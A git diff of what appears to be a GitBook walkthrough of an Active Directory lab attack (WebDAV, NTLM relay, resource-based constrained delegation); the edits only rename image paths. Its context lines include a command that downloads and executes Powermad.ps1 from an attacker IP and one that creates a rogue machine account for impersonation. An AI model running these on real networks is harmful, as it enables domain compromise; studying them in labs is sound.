@@ -18,11 +18,11 @@ Install-WindowsFeature WebDAV-Redirector –Restart
 
 2\. After the server restarts Open the "Windows Defender Firewall" to open up the SMB port.
 
-![](<../../../../.gitbook/assets/image (38) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (38) (1) (1) (1).png>)
 
 3\. Click on "Allow an app or feature through Windows Defender Firewall"
 
-![](<../../../../.gitbook/assets/image (2) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
 
 4\. Select "File and Printer sharing" and click on "OK"
 
@@ -75,7 +75,7 @@ iex (iwr http://192.168.248.3:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (56) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (56) (1) (1) (1) (1).png>)
 
 3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname. We create a DNS record webdav.amsterdam.bank.local to our attacking machine IP.
 
@@ -107,7 +107,7 @@ change-lockscreen -webdav \\webdav@80\
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
-![](<../../../../.gitbook/assets/image (64) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (64) (1) (1) (1) (1) (1).png>)
 
 If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:
 
